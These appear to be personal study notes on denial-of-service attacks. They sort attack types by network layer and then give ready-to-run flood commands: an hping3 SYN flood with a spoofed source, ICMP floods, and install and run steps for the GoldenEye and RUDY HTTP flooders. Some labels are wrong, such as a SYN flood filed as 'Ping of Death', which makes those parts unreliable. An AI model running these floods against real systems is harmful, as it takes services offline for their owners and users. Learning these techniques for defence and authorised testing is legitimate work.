## Denial of Service
Common types of DOS Attacks
* **Buffer Overflow**
Buffer is like the cache of the server and stores temporary data. 
If attacker sends more data than it can handle and the server does not handle it correct, a buffer overflow attack can happen
* **Amplification Attack**
Utilize other servers the attacker already control to amplify the attack to the target.
* **Extensive Resource**
 Attacking RAM, CPU, Bandwidth, Buffer
---
### DOS /DDoS Attacks
The DOS/DDoS attacks can be done on each layer of the ISO model, dependig on the attack
 ![[Pasted image 20250309124152.png]]


### **Application Layer (Layer 7):**
    
-  **#HTTPFlood:** Overwhelms a web server by sending a massive number of HTTP requests, often targeting specific URLs.
        
- #Slowloris: Keeps multiple connections open to a server by sending partial HTTP requests, never completing them, which exhausts the server’s available threads.
        
- **DNS Amplification:** Exploits DNS servers by sending small queries that result in large responses, flooding the target.
        
###  **Presentation Layer (Layer 6):**
    
- Attacks here are less common, but can involve exploitation of data format vulnerabilities or SSL/TLS attacks (like SSL renegotiation attacks), where an attacker repeatedly requests secure handshakes, consuming server resources.
        
### **Session Layer (Layer 5):**
    
- **Session Hijacking:** The attacker takes control of a user's session, potentially causing service disruptions.
        
- **SYN Floods:** Can also be seen as partially impacting this layer by overwhelming session establishment processes.
        
### **Transport Layer (Layer 4):**
    
- **SYN Flood:** Exploits the TCP handshake by sending a flood of SYN requests without responding to SYN-ACKs, leaving connections half-open.
        
- **UDP Flood:** Sends a flood of UDP packets to random ports, causing the target to repeatedly check for non-existent applications, exhausting resources.
        
### **Network Layer (Layer 3):**
    
- **ICMP Flood (Ping Flood):** Overwhelms the target with ICMP Echo requests (pings).
        
- **Smurf Attack:** Uses ICMP requests with a spoofed source address, causing multiple replies to be sent to the target.
        
- **IP Fragmentation Attack:** Sends fragmented packets that the target must reassemble, consuming CPU and memory resources.
        
### **Data Link Layer (Layer 2):**
    
- **MAC Flooding:** Overloads a switch's MAC table, forcing it into a fail-open mode, converting it into a hub and allowing traffic to be sniffed.
        
- **STP (Spanning Tree Protocol) Attack:** Disrupts network topology by injecting fake STP configurations, causing network instability.
        
### **Physical Layer (Layer 1):**
    
- **Cable Cutting:** Physically cutting or damaging network cables to disrupt communication.
        
- **Jamming (Wireless Networks):** Interfering with radio frequencies to block wireless signals.

---





## DOS Attack Tools

### Ping of Death
Tool: HPing3 (pre-installed)
#### Execute:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo hping3 -S -p 80 --flood <ip> -a <spoof_source_ip>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

### ICMP Flood
Tool: HPing3 | ping
[video link ](https://www.youtube.com/watch?v=Zkkd3aavBRo&ab_channel=NetCatTest)
#### Execute:
```
sudo hping -1 --data 65535 -f --flood <ip>
```
- -f  (will fragment the packet to make the server work harder because it will have to assembly at receiving time).
- --flood (send as many packages as possible)
#### Execute:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ping -i 0.1ms -f <ip>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

### Keep Alive + NoCache
Tool:GoldenEye.py 
#### install:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 git clone  https://github.com/jseidl/GoldenEye.git
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#### Execute:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 golden_eye.py “http://example.com”
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

### Low and Low (Slowloris)
Tool: RUDY (R U Dead Yet?) 
Open many connections
Send packets that will take the longest amount of time to process, to keep the server busy.
Send small packets (1Byte) every 10 seconds

#### Install:

```
sudo apt—get update
sudo apt install nodejs npm
git clone https://github.com/sahilchaddha/rudyjs
sudo su
npm install -g rudyjs
```
#### Execute:

```
rudy -t “http://example.com” -n 100 -d 5 -m “GET”
```




Referece:[NetCat Test Youtube Channel](https://www.youtube.com/watch?v=Priw-LhMJDU&ab_channel=NetCatTest)